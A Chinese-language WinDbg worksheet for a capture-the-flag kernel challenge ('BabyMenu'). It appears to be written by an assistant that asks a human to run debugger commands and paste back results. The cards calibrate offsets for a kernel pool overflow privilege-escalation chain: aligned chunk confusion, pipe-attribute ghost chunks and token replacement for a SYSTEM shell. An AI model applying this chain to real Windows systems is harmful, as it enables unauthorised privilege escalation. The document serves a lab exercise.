# WinDbg 操作卡 · 12070 BabyMenu（build 28000 标定）

> 目标：标定 4 个量 + 验证 2 个前提，然后由我算最终 EXP 参数。
> 人类只需**照抄命令、把「回填」那个值贴回来**。每张卡都有「不符怎么办」。
>
> 环境假设：VMware 里题目 VM（Win11 26H1 / 28000.1），**Admin/123** 只用来开调试器和
> 做环境对照；利用本身必须在 **ctfer/123** 会话里跑（README 规定）。
> `ctf123456` 是镜像/VMware 密码。

---

## 卡 0 · 打开本机内核调试（Admin，一次性，需重启）

```cmd
:: 管理员 cmd
bcdedit /debug on
bcdedit /dbgsettings local
shutdown /r /t 0
```

重启后（仍是 Admin）：开 WinDbg →
`File → Attach to Kernel` → 勾 **Local** → OK。

在 WinDbg 命令窗执行：

```
vertarget
```

- **期望**：`Windows 11 Kernel Version 28000.1 MP (x64 free)` 之类。
- **回填**：`vertarget` 的那一行版本号。
- **不符**：若报「不能本机调试 / local kernel debugging is disabled」→ `bcdedit /debug on`
  没生效（Secure Boot 关了才允许），检查 `bcdedit /enum {current}` 里 `debug Yes`、`dbgsettings local`。

> 备用（无本机调试权限时）：起第二个 VM 做网络/串口双机调试
> `bcdedit /dbgsettings net hostip:<宿主机IP> port:50000 key:1.2.3.4` 然后
> `windbg -k net:port=50000,key=1.2.3.4`。

---

## 卡 1 · 符号 + 验证「不用符号也能破 KASLR」

```
.symfix
.reload
lm m nt
lm m npfs
```

- **期望**：两行模块信息，`nt` 的 `start` 形如 `fffff805`xxxxxxxx。
- **回填**：`nt` 的 base（`start` 字段）与 `npfs` 的 base。
- **用途**：等下用 `BabyMenuKit.ps1 -Stage modules` 在 ctfer 会话里取模块基址，
  **两者应完全一致**（差 0）。若不一致，KASLR 泄露路线要改用卡 3 的堆指针走。

---

## 卡 2 · 标定量 A/B/C/D（4 条，逐条回填）

```
? nt
? nt!ExpPoolQuotaCookie
? nt!PsInitialSystemProcess
dt nt!_EPROCESS Token
dt nt!_EPROCESS ActiveProcessLinks
dt nt!_EPROCESS UniqueProcessId
dt nt!_TOKEN Privileges
dq nt!ExpPoolQuotaCookie L1
```

- **期望 / 回填**（请照抄数字）：
  | 量 | 含义 | 回填格式 |
  |---|---|---|
  | A | `nt!ExpPoolQuotaCookie` 的 **RVA** | `? nt!ExpPoolQuotaCookie - nt` 的结果（十六进制） |
  | A' | 该 cookie 的**当前值** | `dq` 输出的第一个 8 字节 |
  | B | `PsInitialSystemProcess` 的 **RVA** | `? nt!PsInitialSystemProcess - nt` |
  | C | `_EPROCESS.Token` 偏移 | `dt` 输出里的 `+0x???` |
  | C' | `_EPROCESS.ActiveProcessLinks` 与 `UniqueProcessId` 偏移 | 同上 |
  | D | `_TOKEN.Privileges`（`Present` / `Enabled` 各自偏移） | 同上 |

- **如果 `? nt!xxx` 报 `Couldn't resolve error`**：符号没加载。
  `.sympath` 里加 `srv*C:\symbols*https://msdl.microsoft.com/download/symbols` 后 `.reload /f`；
  仍失败就用 `.reload /f nt` + `x nt!*Pool*Cookie*` 找符号名（有些版本叫 `nt!ExpPoolQuotaCookie`
  或者被内联，那就记 “NOT FOUND”，我走减一备用路线）。

---

## 卡 2b · 备用路线（quota 减一）才需要的量

```
dt nt!_EPROCESS Quota*
dt nt!_QUOTA_BLOCK
dt nt!_TOKEN IntegrityLevel*
? nt!ExpPoolQuotaCookie - nt
```

- **回填**：
  | 量 | 含义 | 用途 |
  |---|---|---|
  | E | `_EPROCESS` 里 quota 相关字段名与偏移（`QuotaBlock`/`QuotaUsage` 等） | 假 EPROCESS 的字段位置 |
  | F | `_QUOTA_BLOCK` 里被减的那个数组的偏移 + 下标怎么由 PoolType 派生 | 减一的落点 |
  | G | `ExpPoolQuotaCookie` 的 RVA（同名量 A） | ProcessBilled = fakeEproc ^ G ^ cookie |
  | H | `_TOKEN.Privileges` 的 Present/Enabled 偏移（同名量 D） | 抬 SeDebugPrivilege |

- **不适用时**：如果 `dt nt!_EPROCESS Quota*` 显示现代版本已改成 `_QUOTA_BLOCK` 指针链
  或字段被移除，就把整段输出贴回来，我据此改公式（主推荐路线不需要这些）。

---

## 卡 3 · 验证「对齐 chunk 释放校验是否已被加固」（最关键的一张）

这一步决定整条链是否可用。

1. 在 **ctfer** 会话里跑工具包的 ghost 阶段（它会打印自己算出的地址，见下）：
   ```powershell
   powershell -NoProfile -ExecutionPolicy Bypass -File .\BabyMenuKit.ps1 -Stage ghost
   ```
   输出里记下 `V(candidate) = ffff....`（若工具包还没能给出地址，
   就先只跑 `-Stage probe`，我们靠卡 3b 手工取地址）。
2. 在 WinDbg（Admin）里：

```
!pool <V>
```

- **期望（漏洞未加固，链可用）**：一行 `ffff...  130  ....  Allocated`，tag `ycb!`。
- **若显示 `0x130  Free`** → 驱动 chunk 已释放，说明 `-Stage ghost` 跑到了 free 之后，
  重新跑一次只到 overflow 之前（工具包 `-Stage spray` 会停住并打印 V）。

溢出 + 触发之后：

```
!pool <V+0x40>
```

- **期望（Aligned Chunk Confusion 仍有效）**：`0x210  Free`（这是我们造的 ghost chunk）。
- **若变成 `0xC2`/`0xC1` 蓝屏、或 `!pool` 说不合法** → **加固已生效**，
  这条路线作废，改用卡 3b 的备用路线（纯数据攻击：0x20 溢出直接打邻居 body 前 0x10B）。
- **回填**：`!pool <V>` 与 `!pool <V+0x40>` 两行原文。

### 卡 3b ·（备用）取 V 的另一种办法

```
!poolfind ycb! 0x130
```

- **期望**：列出 `ycb!` 的所有 0x130 分配（通常不止一个，因为驱动会泄漏旧指针）。
  最后分配的那个就是当前 `g_buf`。
- 若想确认哪个是当前 g_buf：跑 `-Stage spray` 前 `!poolfind ycb!` 一次、后再一次，
  **新出现/地址最大的那个**就是本次分配的。

---

## 卡 4 · 确认 ghost 里 PipeAttribute 的真实落点（VS 头是否存在）

ghost chunk 起点是 `G = V+0x40`。我们把 0x200 请求的 PipeAttribute 塞进 G 之后，
它的结构体可能落在 `G+0x10`（只有 POOL_HEADER）或 `G+0x20`（VS 后端另有 0x10 头）。

```
dq <G+0x10> L8
dq <G+0x20> L8
```

- **判据**：PipeAttribute 前 16 字节是 `LIST_ENTRY`（两个内核指针，`ffff...` 开头，
  指向 npfs 的 pipe 结构/相邻属性）。**哪个地址看起来像一对内核指针，结构体就在那**。
- **回填**：`G+0x10` / `G+0x20` 两组 `dq` 原文 + 你判断的落点。
- **用途**：这个值填进工具包的 `-GhostStructOff`（默认 0x40 = G+0x10 相对 V 的 body 偏移）。

---

## 卡 5 · 换 token 之后的验收（决定"算不算 SYSTEM shell"）

在 ctfer 会话里跑完 `-Stage steal` 后（它会覆盖本进程 `EPROCESS.Token` 并 `Start-Process cmd`），
在新开的 cmd 窗口里：

```cmd
whoami
echo %USERNAME%
whoami /priv
```

- **期望**：`nt authority\system`；`SYSTEM`；priv 列表里有一堆 `SeDebugPrivilege` / `SeTcbPrivilege`。
- **同时**在 WinDbg 里验证（可选，作为录屏的第二重证据）：

```
!process 0 0 cmd.exe
```

找到新 cmd.exe 的 EPROCESS 地址，然后：

```
dt nt!_EPROCESS <addr> Token
!token <Token指针 & ~0xF>
```

- **期望**：`!token` 显示 `_TOKEN` 且 `User: SYSTEM`。
- **回填**：`whoami` 与 `!token` 输出原文。
- **若 `whoami` 仍是 ctfer**：说明 unlink 写没生效 → 把卡 2 的 C/C' 偏移和
  工具包打印的 `EPROCESS(candidate)`/`[EPROCESS+Token] 原值/新值` 一起回填，我改参数重试。

---

## 卡 6 · 万一符号服务器不通（离线兜底）

```
x nt!*Quota*Cookie*
lm m nt
```

- **期望**：至少能拿到 `nt` base；`ExpPoolQuotaCookie` 找不到没关系——
  **主推荐路线（unlink → EPROCESS.Token）不需要这个 cookie**，只需要卡 2 的 B/C/C'。
- 只要卡 2 的 **B（PsInitialSystemProcess RVA）与 C（Token 偏移）** 能拿到，路线就能跑完。
  `_TOKEN.Privileges`（D）只在备用路线（SeDebugPrivilege）里用。

---

## 回填清单（一次贴回来即可）

```
卡0 vertarget          :
卡1 nt base / npfs base:
卡2 A  (cookie RVA)    :
卡2 A' (cookie value)  :
卡2 B  (PsInitialSystemProcess RVA):
卡2 C  (_EPROCESS.Token off)      :
卡2 C' (ActiveProcessLinks / UniqueProcessId off):
卡2 D  (_TOKEN.Privileges.Present / .Enabled off):
卡3  !pool <V>         :
卡3  !pool <V+0x40>    :
卡3b !poolfind ycb! 0x130（可选）:
卡4  GhostStructOff 判断: 0x10 / 0x20 ?
卡4  dq 原文           :
卡5  whoami / !token   :
工具包各 Stage 的 PASS/FAIL 行:
```
